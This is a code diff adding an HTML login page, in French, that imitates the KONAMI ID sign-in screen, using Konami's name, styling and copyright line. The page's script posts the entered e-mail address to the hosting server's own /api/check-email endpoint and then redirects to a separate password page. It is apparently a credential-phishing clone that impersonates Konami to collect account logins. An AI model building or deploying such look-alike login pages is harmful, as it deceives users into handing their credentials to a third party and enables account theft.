@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>KONAMI ID - Connexion</title>
+    <style>
+          /* Styles partagés */
+        body { font-family: 'Segoe UI', Arial, sans-serif; background-color: #f2f2f2; margin: 0; display: flex; flex-direction: column; min-height: 100vh; }
+        
+        header { 
+            background: #fff; 
+            padding: 15px 20px; 
+            /* Suppression de la bordure rouge ici */
+            border-bottom: none; 
+            display: flex;
+            align-items: center;
+        }
+
+        /* Style pour le texte KONAMI en rouge */
+        .logo-text {
+            color: #c00010;
+            font-weight: bold;
+            font-size: 24px;
+            letter-spacing: 2px;
+            font-family: sans-serif;
+        }
+         /* Style pour le texte KONAMI en rouge */
+        .logo-text {
+            color: #c00010;
+            font-weight: bold;
+            font-size: 24px;
+            letter-spacing: 2px;
+            font-family: sans-serif;
+        }
+
+        .main-container {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .login-box {
+            background: #fff;
+            width: 100%;
+            max-width: 480px;
+            padding: 40px;
+            border: 1px solid #dcdcdc;
+            border-radius: 4px;
+            text-align: center;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+        }
+
+        h2 {
+            color: #777;
+            font-weight: 300;
+            font-size: 24px;
+            margin-bottom: 30px;
+            letter-spacing: 1px;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 14px;
+            margin-bottom: 25px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 15px;
+            box-sizing: border-box;
+            transition: border-color 0.2s;
+        }
+
+        .input-field:focus {
+            outline: none;
+            border-color: #c00010;
+        }
+
+        .btn-red {
+            background-color: #c00010;
+            color: white;
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 4px;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .btn-red:hover {
+            background-color: #a0000d;
+        }
+
+        .separator {
+            margin: 30px 0;
+            display: flex;
+            align-items: center;
+            color: #999;
+            font-size: 14px;
+        }
+
+        .separator::before, .separator::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background: #ddd;
+            margin: 0 15px;
+        }
+
+        .btn-outline {
+            background-color: #c00010;
+            color: white;
+            width: 100%;
+            padding: 12px;
+            border: none;
+            border-radius: 4px;
+            font-weight: bold;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 25px;
+        }
+
+        .help-link {
+            color: #00a1e4;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .register-text {
+            margin-top: 30px;
+            font-size: 14px;
+            color: #666;
+        }
+
+        .register-link {
+            display: block;
+            color: #c00010;
+            text-decoration: none;
+            font-weight: bold;
+            margin-top: 5px;
+        }
+
+        footer {
+            padding: 20px;
+            background: transparent;
+            text-align: center;
+            font-size: 12px;
+            color: #666;
+        }
+
+        .footer-links a {
+            color: #666;
+            text-decoration: none;
+            margin: 0 5px;
+        }
+
+        .footer-links a:hover { text-decoration: underline; }
+    </style>
+</head>
+<body>
+
+<header>
+  <div class="logo-text">KONAMI</div>
+</header>
+
+<div class="main-container">
+    <div class="login-box">
+        <h2>KONAMI ID</h2>
+        
+        <form id="emailForm">
+            <input type="text" id="emailInput" class="input-field" placeholder="KONAMI ID / E-mail address" required>
+            <button type="submit" class="btn-red">Sign in</button>
+        </form>
+
+        <div class="separator"><span>OU</span></div>
+
+        <button class="btn-outline">
+            <span style="font-size: 18px;">👤</span> Connexion avec une clé d’accès
+        </button>
+        
+        <a href="#" class="help-link">Qu'est-ce qu'une clé d’accès ?</a>
+
+        <div class="register-text">
+            Vous n'avez pas de KONAMI ID ?
+            <a href="#" class="register-link">S'enregistrer</a>
+        </div>
+    </div>
+</div>
+
+<footer>
+    <div class="footer-links">
+        <a href="#">CGU / Confidentialité</a> |
+        <a href="#">Trademarks</a> |
+        <a href="#">SUPPORT</a> |
+        <a href="#">Informations sur l'entreprise</a> |
+        <a href="#">Paramètres des cookies</a>
+    </div>
+    <p>©2022 Konami Digital Entertainment</p>
+</footer>
+
+<script>
+    // Déterminer l'URL de base du serveur
+    const API_BASE_URL = window.location.origin;
+
+    document.getElementById('emailForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        const email = document.getElementById('emailInput').value;
+        
+        // Envoyer l'email au backend
+        fetch(`${API_BASE_URL}/api/check-email`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ email: email })
+        })
+        .then(res => res.json())
+        .then(data => {
+            if(data.success) {
+                // Rediriger vers la page de mot de passe
+                window.location.href = 'password.html';
+            } else {
+                alert("Erreur: " + data.message);
+            }
+        })
+        .catch(err => {
+            alert("Erreur de connexion au serveur.");
+            console.error(err);
+        });
+    });
+</script>
+
+</body>
+</html>
